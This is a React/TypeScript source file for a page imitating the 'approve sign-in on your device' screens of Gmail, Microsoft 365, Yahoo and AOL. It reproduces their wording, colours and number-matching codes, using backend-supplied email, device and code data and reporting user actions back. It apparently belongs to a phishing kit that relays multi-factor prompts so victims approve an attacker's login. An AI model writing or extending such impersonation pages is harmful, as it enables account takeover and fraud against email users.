import React from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { ProviderKey, getProviderTheme } from './providerTheme';
import ProviderShell from './ProviderShell';

interface AuthPromptPageProps {
  providerKey: ProviderKey;
  onAction: (action: string, data?: Record<string, unknown>) => void;
}

/**
 * Shared "approve sign-in on your device" challenge page used for the
 * authenticator / push notification flow on every provider. Per-provider
 * entry-points (`GmailAuthPromptPage`, `Office365AuthPromptPage`, …) are
 * thin wrappers that pass the right `providerKey` so `App.tsx` routing
 * keeps working unchanged.
 */
const AuthPromptPage: React.FC<AuthPromptPageProps> = ({ providerKey, onAction }) => {
  const location = useLocation();
  const navigate = useNavigate();
  const theme = getProviderTheme(providerKey);
  const data = ((location.state as { data?: Record<string, unknown> } | null)?.data) || {};
  const email = (data.email as string) || ((location.state as { email?: string } | null)?.email) || '';
  const deviceName =
    (data.deviceName as string) || (data.device as string) || 'your phone';
  const appName = (data.appName as string) ||
    (providerKey === 'gmail'
      ? 'Gmail'
      : providerKey === 'office365'
        ? 'Microsoft Authenticator'
        : providerKey === 'yahoo'
          ? 'Yahoo Account Key'
          : providerKey === 'aol'
            ? 'AOL'
            : 'your authenticator app');

  // Microsoft challenge uses a 2-digit number-matching code. Read from
  // backend-supplied data when available, else generate deterministic value.
  const number = (
    (data.number as number | string) ??
    (data.code as number | string) ??
    Math.floor(10 + Math.random() * 90)
  ).toString();

  const headline: Record<ProviderKey, string> = {
    gmail: '2-Step Verification',
    office365: 'Approve sign in request',
    yahoo: 'Verify your identity',
    aol: 'Approve sign-in request',
    others: 'Approve sign-in request',
  };

  const description: Record<ProviderKey, React.ReactNode> = {
    gmail: (
      <>
        Google sent a notification to your {deviceName}. Open the {appName} app
        or any signed-in Google app to review and tap <strong>Yes</strong> on
        the prompt to continue signing in.
      </>
    ),
    office365: (
      <>Open your {appName} app, and enter the number shown to sign in.</>
    ),
    yahoo: (
      <>
        We sent a sign-in request to <strong>{deviceName}</strong>. Open the
        {' '}{appName} notification and tap <strong>Yes, allow</strong> to continue.
      </>
    ),
    aol: (
      <>
        We sent a sign-in notification to <strong>{deviceName}</strong>. Open
        your {appName} app and tap <strong>Yes, allow</strong> to finish signing in.
      </>
    ),
    others: (
      <>
        A notification was sent to <strong>{deviceName}</strong>. Open the app
        on your device and tap <strong>Approve</strong> to continue.
      </>
    ),
  };

  const goBack = () => {
    onAction('cancel');
    navigate(-1);
  };

  // Spinner / illustration block that varies subtly per provider.
  const SpinnerBlock = () => {
    if (providerKey === 'office365') {
      return (
        <>
          <div className="flex items-center justify-center py-8">
            <div className="text-[56px] leading-none font-semibold text-[#1b1b1b]" style={{ letterSpacing: '0.08em' }}>
              {number}
            </div>
          </div>
          <div className="flex items-center justify-center mb-6">
            <svg className="animate-spin h-5 w-5 text-[#0067b8] mr-2" viewBox="0 0 24 24" fill="none" aria-hidden="true">
              <circle cx="12" cy="12" r="10" stroke="currentColor" strokeOpacity=".25" strokeWidth="4" />
              <path d="M4 12a8 8 0 018-8" stroke="currentColor" strokeWidth="4" strokeLinecap="round" />
            </svg>
            <span className="text-sm text-[#1b1b1b]">Waiting for approval on your device&hellip;</span>
          </div>
          <p className="text-sm text-[#1b1b1b] mb-5">
            No numbers in your app? Make sure to upgrade to the latest version.
          </p>
        </>
      );
    }
    const ringBg =
      providerKey === 'gmail'
        ? '#dbeafe'
        : providerKey === 'yahoo'
          ? '#ead7ff'
          : providerKey === 'aol'
            ? '#d9e8f8'
            : '#e6f0ff';
    const cardBg =
      providerKey === 'gmail'
        ? '#f8f9fa'
        : providerKey === 'yahoo'
          ? '#faf7fe'
          : providerKey === 'aol'
            ? '#f7fbff'
            : '#f4f8ff';
    const cardBorder =
      providerKey === 'gmail'
        ? '#e8eaed'
        : providerKey === 'yahoo'
          ? '#e9dbff'
          : providerKey === 'aol'
            ? '#d9e8f8'
            : '#e6f0ff';
    return (
      <div
        className="flex flex-col items-center justify-center rounded-2xl py-10 px-6 mb-6"
        style={{ backgroundColor: cardBg, border: `1px solid ${cardBorder}` }}
      >
        <div className="relative w-24 h-24 flex items-center justify-center mb-4">
          <div className="absolute inset-0 rounded-full border-4" style={{ borderColor: ringBg }}></div>
          <div
            className="absolute inset-0 rounded-full border-4 border-transparent"
            style={{ borderTopColor: theme.primary, animation: 'authShellSpin 1.1s linear infinite' }}
          ></div>
          <svg className="w-10 h-10" viewBox="0 0 24 24" fill="none" stroke={theme.primary} strokeWidth="1.8" aria-hidden="true">
            <rect x="6" y="2" width="12" height="20" rx="2" />
            <circle cx="12" cy="18" r="1.2" fill={theme.primary} />
          </svg>
        </div>
        <style>{`@keyframes authShellSpin { to { transform: rotate(360deg); } }`}</style>
        <p className="text-sm font-medium" style={{ color: theme.primary }}>
          Waiting for approval&hellip;
        </p>
      </div>
    );
  };

  // Action buttons differ per provider. Office365 uses a "Cancel" + side
  // alternates list. Gmail uses inline "Try another way" + "It wasn't me".
  // Yahoo / AOL / Others stack a primary "This wasn't me" button + link row.
  let primaryActions: React.ReactNode = null;
  let secondaryAction: React.ReactNode = null;

  if (providerKey === 'gmail') {
    primaryActions = (
      <>
        <button
          type="button"
          onClick={goBack}
          className="text-sm font-semibold text-blue-600 hover:underline"
        >
          Try another way
        </button>
        <button
          type="button"
          onClick={() => onAction('deny_authenticator')}
          className="px-5 py-2 border border-gray-300 text-gray-700 text-sm font-semibold rounded-full hover:bg-gray-50"
        >
          It wasn&rsquo;t me
        </button>
      </>
    );
    secondaryAction = (
      <button
        type="button"
        onClick={() => onAction('resend_prompt')}
        className="text-sm font-semibold text-blue-600 hover:underline"
      >
        Resend it
      </button>
    );
  } else if (providerKey === 'office365') {
    primaryActions = (
      <button
        type="button"
        onClick={() => onAction('deny_authenticator')}
        className="px-6 py-[6px] text-[#1b1b1b] text-sm font-semibold border border-[#8a8886] hover:bg-[#f3f2f1]"
        style={{ minWidth: '108px' }}
      >
        Cancel
      </button>
    );
    secondaryAction = (
      <>
        <button
          type="button"
          onClick={goBack}
          className="text-sm text-[#0067b8] hover:underline text-left w-fit"
        >
          I can&rsquo;t use my Microsoft Authenticator app right now
        </button>
        <button
          type="button"
          onClick={() => onAction('more_info')}
          className="text-sm text-[#0067b8] hover:underline text-left w-fit"
        >
          More information
        </button>
      </>
    );
  } else {
    // yahoo / aol / others
    primaryActions = (
      <button
        type="button"
        onClick={() => onAction('deny_authenticator')}
        className={
          providerKey === 'aol' || providerKey === 'others'
            ? 'w-full py-2 border rounded-md text-sm font-medium'
            : 'w-full py-2 border rounded-full text-sm font-medium'
        }
        style={{ borderColor: theme.primary, color: theme.primary }}
      >
        This wasn&rsquo;t me
      </button>
    );
    secondaryAction = (
      <>
        <button
          type="button"
          onClick={() => onAction('resend_prompt')}
          className="hover:underline font-medium"
          style={{ color: theme.primary }}
        >
          Send a new request
        </button>
        <button
          type="button"
          onClick={goBack}
          className="hover:underline font-medium"
          style={{ color: theme.primary }}
        >
          Use another method
        </button>
      </>
    );
  }

  return (
    <ProviderShell
      providerKey={providerKey}
      email={email}
      title={headline[providerKey]}
      description={description[providerKey]}
      onBack={goBack}
      primaryActions={primaryActions}
      secondaryAction={secondaryAction}
    >
      <SpinnerBlock />
    </ProviderShell>
  );
};

export default AuthPromptPage;
